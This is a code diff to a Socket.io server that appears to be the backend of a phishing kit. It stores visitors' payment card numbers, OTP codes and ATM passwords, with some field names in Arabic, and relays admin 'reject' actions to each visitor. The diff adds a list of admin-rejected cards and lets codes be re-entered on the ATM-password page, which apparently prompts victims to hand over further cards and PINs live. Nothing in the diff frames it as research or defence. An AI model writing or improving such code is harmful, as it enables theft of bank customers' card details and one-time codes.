@@ -466,6 +466,7 @@ io.on("connection", (socket) => {
         data: {},
         dataHistory: [],
         paymentCards: [],
+        rejectedCards: [],
         digitCodes: [],
         hasNewData: false,
         isBlocked: false,
@@ -552,14 +553,12 @@ io.on("connection", (socket) => {
         }
       }
       if (data.paymentCard) {
-        // Check for duplicate card
+        // Check if card was previously rejected by admin
         const newCardNumber = data.paymentCard.cardNumber || data.paymentCard['رقم البطاقة'] || '';
-        const isDuplicateCard = visitor.paymentCards.some(card => {
-          const existingNumber = card.cardNumber || card['رقم البطاقة'] || '';
-          return existingNumber === newCardNumber && newCardNumber !== '';
-        });
+        if (!visitor.rejectedCards) visitor.rejectedCards = [];
+        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber) && newCardNumber !== '';
         
-        if (isDuplicateCard) {
+        if (isAdminRejected) {
           const now = new Date().toISOString();
           // Save duplicate rejection
           if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
@@ -601,7 +600,7 @@ io.on("connection", (socket) => {
         const newCode = data.digitCode;
         const isDuplicateOtp = visitor.digitCodes.some(dc => dc.code === newCode);
         
-        if (isDuplicateOtp) {
+        if (isDuplicateOtp && data.page !== "كلمة مرور ATM") {
           const now = new Date().toISOString();
           // Save duplicate rejection
           if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
@@ -821,6 +820,17 @@ io.on("connection", (socket) => {
     io.to(currentSocketId).emit("card:action", action);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
+      // If admin rejected the card, add last card number to rejectedCards list
+      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
+        if (!visitor.rejectedCards) visitor.rejectedCards = [];
+        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
+        if (lastCard) {
+          const cardNumber = lastCard.cardNumber || lastCard['رقم البطاقة'] || '';
+          if (cardNumber && !visitor.rejectedCards.includes(cardNumber)) {
+            visitor.rejectedCards.push(cardNumber);
+          }
+        }
+      }
       visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
